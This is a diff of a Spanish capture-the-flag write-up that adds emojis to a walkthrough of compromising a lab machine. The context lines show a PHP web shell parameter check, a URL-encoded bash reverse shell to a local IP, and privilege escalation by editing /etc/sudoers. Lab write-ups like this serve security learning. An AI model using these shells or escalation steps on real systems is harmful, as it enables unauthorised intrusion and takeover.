@@ -53,7 +53,7 @@ if(isset($_GET['cmd']))
 
 <img width="1210" height="619" alt="candy10" src="https://github.com/user-attachments/assets/0483b2af-d85a-4988-ab99-66e5789a8bfc" />
 
-Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuario por defecto de la máquina víctima, ¡en este punto logramos ejecutar comandos a nivel de sistema!
+Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuario por defecto de la máquina víctima, ¡en este punto logramos ejecutar comandos a nivel de sistema! 🔥
 
 <img width="829" height="316" alt="candy11" src="https://github.com/user-attachments/assets/ac408379-28ff-40b7-a6a5-abea600f4d2a" />
 
@@ -67,7 +67,7 @@ bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
 
 <img width="1019" height="316" alt="candy13" src="https://github.com/user-attachments/assets/a9a7760b-82ad-4f17-8ac5-6ab2b4bc31f7" />
 
-¡Y en este punto ya estamos dentro de la máquina víctima!
+¡Y en este punto ya estamos dentro de la máquina víctima! 🔥
 
 <img width="1019" height="316" alt="candy14" src="https://github.com/user-attachments/assets/66d78beb-fc52-4070-84c1-e6f81a23238b" />
 
@@ -102,5 +102,5 @@ Lo primero que se ocurre es indicarle al archivo /etc/sudoers que nos de privile
 
 <img width="1051" height="245" alt="candy20" src="https://github.com/user-attachments/assets/d3068ba4-9171-4fff-881f-d1c2c4420ba4" />
 
-¡Ya somos root!, máquina hackeada.-
+¡Finalmente ya somos root!, máquina hackeada 🔥.-
 
